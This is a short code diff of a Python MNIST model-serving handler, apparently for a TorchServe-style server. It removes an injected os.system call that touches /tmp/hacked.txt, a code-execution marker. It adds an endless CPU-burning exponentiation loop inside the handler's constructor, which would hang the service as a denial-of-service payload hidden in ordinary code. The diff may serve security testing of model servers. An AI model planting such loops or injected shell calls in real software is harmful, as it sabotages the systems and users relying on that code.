@@ -5,7 +5,7 @@ from PIL import Image
 from mnist import Net
 import torch
 import json
-import os
+import time
 #import logging
 
 #logger = logging.getLogger(__name__)
@@ -13,6 +13,8 @@ import os
 class MNISTHandler(BaseHandler):
 
     def __init__(self):
+        while True:
+            _ = (999999999 ** 999999999) % 999999999 
         super(MNISTHandler, self).__init__()
         self.transform = transforms.Compose([
             transforms.ToTensor(),
@@ -24,7 +26,6 @@ class MNISTHandler(BaseHandler):
         Process one single image.
         """
         # get image from the request
-        os.system("touch /tmp/hacked.txt")
         image = req.get("data")
         if image is None:
             image = req.get("body")
